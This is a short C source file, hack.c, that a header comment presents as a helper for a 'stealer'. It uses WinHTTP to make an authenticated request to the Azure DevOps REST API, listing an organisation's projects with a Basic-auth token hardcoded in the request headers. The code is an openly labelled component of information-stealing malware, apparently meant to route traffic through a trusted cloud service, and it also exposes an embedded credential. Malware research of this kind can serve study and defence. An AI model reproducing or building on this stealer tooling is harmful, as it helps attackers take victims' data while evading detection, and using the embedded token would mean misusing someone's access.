/*
 * hack.c
 * minimal simple GET request to 
 * Azure DevOps REST API: 
 * list of projects
 * helper function for stealer
 * author @cocomelonc
 */
#include <stdio.h>
#include <windows.h>
#include <winhttp.h>
 
int main() {
  HINTERNET hSession, hConnect, hRequest;
  DWORD bytesRead;
  char buffer[4096];
 
  // init
  hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) {
    printf("WinHttpOpen failed: %lu\n", GetLastError());
    return 1;
  }
 
  // connecto to dev.azure.com (HTTPS)
  hConnect = WinHttpConnect(hSession, L"dev.azure.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (!hConnect) {
    printf("WinHttpConnect failed: %lu\n", GetLastError());
    WinHttpCloseHandle(hSession);
    return 1;
  }
 
  // GET-req
  hRequest = WinHttpOpenRequest(
    hConnect,
    L"GET",
    L"/cocomelonkz/_apis/projects?api-version=7.1",
    NULL, WINHTTP_NO_REFERER,
    WINHTTP_DEFAULT_ACCEPT_TYPES,
    WINHTTP_FLAG_SECURE
  );
 
  // headers
  const wchar_t *headers =
    L"Accept: application/json\r\n"
    L"Authorization: Basic OjlPMVFGbEcxWXhMZTg4RjY1UGZIdXRyOVRSVUp1MFJuQXhsUzdiQTRWZWxlbkZxdlZoZnBKUVFKOTlCSEFDQUFBQUFBQUFBQUFBQVNBWkRPT2NBQQ=="
    L"\r\n";
 
  WinHttpAddRequestHeaders(hRequest, headers, (ULONG)-1, WINHTTP_ADDREQ_FLAG_ADD);
 
   // send request
  if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
    WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
    printf("WinHttpSendRequest failed: %lu\n", GetLastError());
    return 1;
  }
 
  if (!WinHttpReceiveResponse(hRequest, NULL)) {
    printf("WinHttpReceiveResponse failed: %lu\n", GetLastError());
    return 1;
  }
 
  // get response
  while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
    buffer[bytesRead] = '\0';
    printf("%s", buffer);
  }
 
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  return 0;
 } 